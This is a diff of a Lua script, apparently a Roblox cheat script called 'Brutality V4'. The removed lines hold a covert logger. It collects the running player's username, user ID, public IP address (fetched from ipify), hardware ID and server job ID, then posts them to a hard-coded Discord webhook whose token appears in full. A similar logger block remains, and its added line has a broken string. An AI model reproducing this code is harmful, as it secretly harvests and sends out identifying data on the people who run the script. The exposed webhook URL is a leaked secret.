@@ -16,75 +16,9 @@ function AdminLoggerMsg()
     AdminMessage = {
         ["embeds"] = {
             {
-                ["title"] = "**User Brutality V4**",
-                ["description"] = "Player Sea 1",
-                ["type"] = "rich",
-                ["color"] = tonumber(0xffffff), --brown
-                ["fields"] = {
-                    {
-                        ["name"] = "**Username**",
-                        ["thumbnail"] = "https://www.roblox.com/headshot-thumbnail/image?userId=".. LocalPlayer.UserId " ,
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**UserID**",
-                        ["value"] = "```" .. game.Players.LocalPlayer.UserId .. "```",
-                        ["inline"] = true
-                    },
-                    {
-                        ["name"] = "**PlaceID**",
-                        ["value"] = "```" .. game.PlaceId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**IP Address**",
-                        ["value"] = "```" .. tostring(game:HttpGet("https://api.ipify.org", true)) .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Hwid**",
-                        ["value"] = "```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**JobID**",
-                        ["value"] = "```" .. game.JobId .. "```",
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "**Join Code**",
-                        ["value"] = "```lua" .. "\n" .. "game.ReplicatedStorage['__ServerBrowser']:InvokeServer('teleport','" .. game.JobId .. "')" .. "```",
-                        ["inline"] = false
-                    }
-                },
-                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
-            }
-        }
-    }
-    return AdminMessage
-end
-
-PostWebhook("https://discord.com/api/webhooks/1274066820009037956/jK-EgqCx3thzF9ctrAB_N1Zv9JVvaCSZYW37sD3LDk8diLmgrTn0miuqONzob8uaqnbJ", AdminLoggerMsg())
-function PostWebhook(Url, message)
-    local request = http_request or request or HttpPost or syn.request
-    local data =
-        request(
-        {
-            Url = Url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = game:GetService("HttpService"):JSONEncode(message)
-        }
-    )
-    return ""
-end
-
-function AdminLoggerMsg()
-    AdminMessage = {
-        ["embeds"] = {
-            {
                 ["title"] = "**NewBrutality V4**",
                 ["description"] ="Thanks for using",
+                ["thumbnail"] = "https://www.roblox.com/headshot-thumbnail/image?userId=".. LocalPlayer.UserId ..",
                 ["type"] = "rich",
                 ["color"] = tonumber(0xffffff), --brown
                 ["fields"] = {
